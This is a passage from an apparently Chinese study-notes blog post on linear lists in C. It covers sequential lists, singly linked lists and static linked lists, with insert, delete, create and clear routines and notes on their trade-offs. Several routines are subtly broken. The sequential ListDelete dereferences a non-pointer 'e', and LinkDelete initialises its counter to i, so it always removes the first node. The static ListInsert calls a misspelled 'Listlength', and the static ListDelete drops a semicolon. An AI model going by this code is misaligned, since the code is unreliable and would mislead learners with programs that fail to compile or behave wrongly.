class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000  <span class="comment">//储存空间初始分配量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> length;  <span class="comment">//线性表当前长度</span></span><br><span class="line">}SqList;</span><br></pre></td></tr></tbody></table></figure><h3 id="顺序表的操作"><a class="markdownIt-Anchor" href="#顺序表的操作"></a> 顺序表的操作</h3><h4 id="获得元素操作"><a class="markdownIt-Anchor" href="#获得元素操作"></a> 获得元素操作</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetElem</span><span class="params">(SqList L, <span class="keyword">int</span> i, ElemType* e)</span> <span class="comment">//获得元素——&gt;e返回L中第i个数据元素的值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (L.length == <span class="number">0</span> || i&lt;<span class="number">1</span> || i&gt;L.length)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = L.data[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="插入操作"><a class="markdownIt-Anchor" href="#插入操作"></a> 插入操作</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(SqList* L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">//插入操作——&gt;在L中第i个位置之前插入新的数据元素e，L的长度加1</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (L-&gt;length == MAXSIZE) <span class="comment">//线性表已满</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length + <span class="number">1</span>) <span class="comment">//i不在范围内</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i &lt;= L-&gt;length) <span class="comment">//插入的元素不在表尾 (可加if可不加)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = L-&gt;length - <span class="number">1</span>; k &gt;= i - <span class="number">1</span>; k--)</span><br><span class="line">{</span><br><span class="line">L-&gt;data[k + <span class="number">1</span>] = L-&gt;data[k];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">L-&gt;data[i - <span class="number">1</span>] = e; <span class="comment">//新元素插入</span></span><br><span class="line">L-&gt;length++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除操作"><a class="markdownIt-Anchor" href="#删除操作"></a> 删除操作</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListDelete</span><span class="params">(SqList* L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">//删除操作</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">if</span> (L-&gt;length == <span class="number">0</span>) <span class="comment">//线性表为空</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L-&gt;length) <span class="comment">//删除位置不正确</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">*e = L-&gt;data[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (i &lt; L-&gt;length) <span class="comment">//删除不是最后位置</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (k = i; k &lt; L-&gt;length; k++) <span class="comment">//删除位置后继元素前移</span></span><br><span class="line">{</span><br><span class="line">L-&gt;data[k - <span class="number">1</span>] = L-&gt;data[k];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">L-&gt;length--;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="优缺点"><a class="markdownIt-Anchor" href="#优缺点"></a> 优缺点</h3><p><em><strong>1、优点：</strong></em></p><p><em><strong>①无需为表中元素之间的逻辑关系增加额外的储存空间；</strong></em></p><p><em><strong>②可以快速的存取表中任意位置的元素；</strong></em></p><p><em><strong>2、缺点：</strong></em></p><p><em><strong>①插入和删除操作需要移动大量元素；</strong></em></p><p><em><strong>②当线性表长度变化较大时，难以确定储存空间的容量；</strong></em></p><p><em><strong>③造成储存空间的“碎片”；</strong></em></p><h2 id="线性表的链式储存结构链表"><a class="markdownIt-Anchor" href="#线性表的链式储存结构链表"></a> 线性表的链式储存结构——链表</h2><p>链表在之前的博客里面已经整理了一部分，在这里再整理一遍吧；</p><h3 id="单链表"><a class="markdownIt-Anchor" href="#单链表"></a> 单链表</h3><p>先定义一个结构体</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">}Node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span> <span class="comment">//定义LinkList</span></span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的读取"><a class="markdownIt-Anchor" href="#单链表的读取"></a> 单链表的读取</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetElem</span><span class="params">(LinkList L, <span class="keyword">int</span> i, ElemType* e)</span> <span class="comment">//用e返回L中第i个数据元素的值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">LinkList p;   <span class="comment">//声明指针p</span></span><br><span class="line">p = L-&gt;next;  <span class="comment">//p指向链表L的第一个节点</span></span><br><span class="line">j = <span class="number">1</span>;    <span class="comment">//j为计数器</span></span><br><span class="line"><span class="keyword">while</span> (p &amp;&amp; j &lt; i) <span class="comment">//p不为空且计数器j还没有等于i时，循环继续</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;next; <span class="comment">//p指向下一个节点</span></span><br><span class="line">++j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!p || j &gt; i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//第i个节点不存在</span></span><br><span class="line">}</span><br><span class="line">*e = p-&gt;data;  <span class="comment">//取第i个节点的数据</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的插入"><a class="markdownIt-Anchor" href="#单链表的插入"></a> 单链表的插入</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(LinkList* L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">//在L的第i个节点之前插入元素e，L的长度加1</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">LinkList p,s;</span><br><span class="line">p = *L;</span><br><span class="line">j = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (p &amp;&amp; j &lt; i) <span class="comment">//寻找第i-1个节点</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">++j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!p || j &lt; i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//第i个节点不存在</span></span><br><span class="line">}</span><br><span class="line">s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node)); <span class="comment">//生成新节点</span></span><br><span class="line">s-&gt;data = e;</span><br><span class="line">s-&gt;next = p-&gt;next;  <span class="comment">//将p的后继节点赋值给s的后继</span></span><br><span class="line">p-&gt;next = s;  <span class="comment">//将s赋值给p的后继</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的删除"><a class="markdownIt-Anchor" href="#单链表的删除"></a> 单链表的删除</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LinkDelete</span><span class="params">(LinkList* L, <span class="keyword">int</span> i, ElemType* e)</span> <span class="comment">//删除L中的第i个节点，并用e返回其值，L的长度减1</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">LinkList p, q;</span><br><span class="line">p = *L;</span><br><span class="line">j = i;</span><br><span class="line"><span class="keyword">while</span> (p-&gt;next &amp;&amp; j &lt; i) <span class="comment">//遍历寻找第i-1个节点</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">++j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;next) || j &gt; i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//第i个节点不存在</span></span><br><span class="line">}</span><br><span class="line">q = p-&gt;next;</span><br><span class="line">p-&gt;next = q-&gt;next; <span class="comment">//将q的后继赋值给p的后继</span></span><br><span class="line">*e = q-&gt;data;   <span class="comment">//将q节点中的数据给e</span></span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的整表创建"><a class="markdownIt-Anchor" href="#单链表的整表创建"></a> 单链表的整表创建</h4><h5 id="头插法"><a class="markdownIt-Anchor" href="#头插法"></a> 头插法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListHead</span><span class="params">(LinkList* L, <span class="keyword">int</span> n)</span> <span class="comment">//随机产生n个元素的值，建立带表头节点的单链线性表L（头插法）</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">srand(time(<span class="number">0</span>));  <span class="comment">//初始化随机种子</span></span><br><span class="line">*L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">(*L)-&gt;next = <span class="literal">NULL</span>;   <span class="comment">//先建立一个带头结点的单链表</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">{</span><br><span class="line">p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node)); <span class="comment">//生成新节点</span></span><br><span class="line">p-&gt;data = rand() % <span class="number">100</span> + <span class="number">1</span>;  <span class="comment">//随机生成100以内的数字</span></span><br><span class="line">p-&gt;next = (*L)-&gt;next;</span><br><span class="line">(*L)-&gt;next = p;   <span class="comment">//插入到表头</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾插法"><a class="markdownIt-Anchor" href="#尾插法"></a> 尾插法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListTail</span><span class="params">(LinkList* L, <span class="keyword">int</span> n)</span><span class="comment">//随机产生n个元素的值，建立带表头节点的单链线性表L（尾插法）</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList p, r;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">srand(time(<span class="number">0</span>));</span><br><span class="line">*L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">r = *L;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">{</span><br><span class="line">p = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));  <span class="comment">//生成新节点</span></span><br><span class="line">p-&gt;data = rand() % <span class="number">100</span> + <span class="number">1</span>;</span><br><span class="line">r-&gt;next = p;  <span class="comment">//将表尾终端节点的指针指向新节点</span></span><br><span class="line">r = p;  <span class="comment">//将当前的新节点定义为表尾终端节点</span></span><br><span class="line">}</span><br><span class="line">r-&gt;next = <span class="literal">NULL</span>;  <span class="comment">//表示当前链表结束</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="清空链表"><a class="markdownIt-Anchor" href="#清空链表"></a> 清空链表</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ClearList</span><span class="params">(LinkList* L)</span> <span class="comment">//单链表的整表删除，将L置为空表</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList p, q;</span><br><span class="line">p = (*L)-&gt;next; <span class="comment">//p指向第一个节点</span></span><br><span class="line"><span class="keyword">while</span> (p)  <span class="comment">//没到表尾</span></span><br><span class="line">{</span><br><span class="line">q = p-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">p = q;</span><br><span class="line">}</span><br><span class="line">(*L)-&gt;next = <span class="literal">NULL</span>;  <span class="comment">//头结点指针域为空</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表结构与顺序存储结构优缺点"><a class="markdownIt-Anchor" href="#单链表结构与顺序存储结构优缺点"></a> 单链表结构与顺序存储结构优缺点</h4><p><em><strong>1、存储分配方式</strong></em></p><p>​        <em><strong>①顺序存储结构一般用一段连续的存储单元依次存储线性表的数据元素</strong></em></p><p>​        <em><strong>②单链表采用链式存储结构，用一组任意的存储大单元存放线性表的元素</strong></em></p><p><em><strong>2、时间性能</strong></em></p><p><em><strong>①查找</strong></em></p><p><em><strong>ⅰ顺序存储结构O(1)</strong></em></p><p><em><strong>ⅱ单链表O(n)</strong></em></p><p><em><strong>②插入和删除</strong></em></p><p>​<em><strong>ⅰ顺序存储结构需要平均移动表长一半的元素，时间为o(n)</strong></em></p><p>​<em><strong>ⅱ单链表在线出某位置的指针后，插入和删除时间仅为o(1)</strong></em></p><p><em><strong>③空间性能</strong></em></p><p>​<em><strong>ⅰ顺序存储结构需要预分配存储空间，分大了，浪费，分小了，易发生上溢</strong></em></p><p>​<em><strong>ⅱ单链表不需要分配存储空间，只要有就可以分配，元素个数也不受限制</strong></em></p><h2 id="静态链表"><a class="markdownIt-Anchor" href="#静态链表"></a> 静态链表</h2><h3 id="定义-3"><a class="markdownIt-Anchor" href="#定义-3"></a> 定义</h3><p>用数组描述的链表叫做静态链表 ；</p><p>具体描述：首先让数组的两个元素都是由两个数据域组成，data和cur；也就是说，数组的每个下标都对应一个</p><p>data和cur；数据域data，用来存放数据元素,也就是通常我们要处理的数据；而cur相当于链表中的next指针，存</p><p>放该元素的后继在数组中的下标，我们把cur叫做游标；</p><p>小注：这里我理解的游标就是next那根链，元素的游标指向下一个数值的下标；;</p><h3 id="静态链表存储结构"><a class="markdownIt-Anchor" href="#静态链表存储结构"></a> 静态链表存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000 <span class="comment">// 假设链表最大长度是1k</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="keyword">int</span> cur; <span class="comment">//游标，为0时表示无指向</span></span><br><span class="line">}StaticLinkList[MAXSIZE];</span><br></pre></td></tr></tbody></table></figure><h3 id="初始化数组"><a class="markdownIt-Anchor" href="#初始化数组"></a> 初始化数组</h3><p>0-998游标从1-999，最后一个游标为0</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitLink</span><span class="params">(StaticLinkList space)</span> <span class="comment">//将一位数组space中各分量链成一备用链表，space[0].cur为头指针，"0"表示空指针</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXSIZE - <span class="number">1</span>; i++)</span><br><span class="line">{</span><br><span class="line">space[i].cur = i + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">space[MAXSIZE - <span class="number">1</span>].cur = <span class="number">0</span>; <span class="comment">//目前静态链表为空，最后一个元素的cur为0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注：</p><p>​我们通常把未使用的数组元素成为备用链表；</p><p>​数组的第一个元素，即下标为0的那个元素的cur就存放备用链表的第一个节点的下标；</p><p>​数组的最后一个元素，即下标为MAXSIZE-1的cur则存放第一个有数值的元素的下标，相当于头节点的作用；</p><h3 id="获取链表中元素的个数"><a class="markdownIt-Anchor" href="#获取链表中元素的个数"></a> 获取链表中元素的个数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(StaticLinkList L)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = L[MAXSIZE - <span class="number">1</span>].cur; <span class="comment">//最后一个元素的游标，从头循环计数</span></span><br><span class="line"><span class="keyword">while</span> (i) <span class="comment">//循环计数，找到空闲分量即停止循环</span></span><br><span class="line">{</span><br><span class="line">i = L[i].cur; </span><br><span class="line">j++;  <span class="comment">//计数</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> j;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="静态链表的插入操作"><a class="markdownIt-Anchor" href="#静态链表的插入操作"></a> 静态链表的插入操作</h3><h4 id="获得空闲分量的下标"><a class="markdownIt-Anchor" href="#获得空闲分量的下标"></a> 获得空闲分量的下标</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Malloc_SSL</span><span class="params">(StaticLinkList space)</span> <span class="comment">//若备用空间链表为空，则返回分配的节点下标，否则返回0</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = space[<span class="number">0</span>].cur; <span class="comment">//当前数组第一个元素cur存的值，就是要返回的第一个备用空闲的下标</span></span><br><span class="line"><span class="keyword">if</span> (space[<span class="number">0</span>].cur)</span><br><span class="line">{</span><br><span class="line">space[<span class="number">0</span>].cur = space[i].cur; <span class="comment">// 由于要拿出一个分量来使用，所以我们就得把它的下一个分量用来做备用</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="插入"><a class="markdownIt-Anchor" href="#插入"></a> 插入</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(StaticLinkList L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">// 在L中第i个元素之前插入新的数据元素e</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j, k, l;</span><br><span class="line">k = MAXSIZE - <span class="number">1</span>;  <span class="comment">//k是最后一个元素的下标</span></span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;Listlength(L) + <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">j = Malloc_SSL(L);  <span class="comment">//获得空闲分量的下标</span></span><br><span class="line"><span class="keyword">if</span> (j)</span><br><span class="line">{</span><br><span class="line">L[j].data = e; <span class="comment">//将数值赋值给此分量的data</span></span><br><span class="line"><span class="keyword">for</span> (l = <span class="number">1</span>; l &lt;= i - <span class="number">1</span>; l++)  <span class="comment">//找到第i个元素之前的位置</span></span><br><span class="line">{</span><br><span class="line">k = L[k].cur;</span><br><span class="line">}</span><br><span class="line">L[j].cur = L[k].cur;  <span class="comment">//把第i个元素之前的cur赋值给新元素的cur</span></span><br><span class="line">L[k].cur = j;  <span class="comment">//把新元素的下标赋值给第i个元素之前元素的cur</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="静态链表的删除操作"><a class="markdownIt-Anchor" href="#静态链表的删除操作"></a> 静态链表的删除操作</h3><h4 id="回收节点"><a class="markdownIt-Anchor" href="#回收节点"></a> 回收节点</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free_SSL</span><span class="params">(StaticLinkList space,<span class="keyword">int</span> k)</span><span class="comment">//将下标为k的空闲节点回收到备用链表</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">space[k].cur = space[<span class="number">0</span>].cur; <span class="comment">//把第一个元素cur值赋给要删除的分量cur</span></span><br><span class="line">space[<span class="number">0</span>].cur = k; <span class="comment">//把要删除的分量下标赋给第一个元素的cur</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListDelete</span><span class="params">(StaticLinkList L, <span class="keyword">int</span> i)</span> <span class="comment">// 删除L中第i个元素e</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j, k;</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;ListLength(L))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">}</span><br><span class="line">k = MAXSIZE - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= i - <span class="number">1</span>; j++)</span><br><span class="line">{</span><br><span class="line">k = L[k].cur;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// j &gt; k</span></span><br><span class="line">j = L[k].cur;  <span class="comment">//L[k].cur指向删除元素的下标，赋值给j</span></span><br><span class="line">L[k].cur = L[j].cur;  <span class="comment">//被删除元素的游标赋值给前一个元素的游标，实现连接</span></span><br><span class="line">Free_SSL(L, j); <span class="comment">//回收</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="静态链表优缺点"><a class="markdownIt-Anchor" href="#静态链表优缺点"></a> 静态链表优缺点</h3><p><em><strong>1、优点：</strong></em></p><p>​        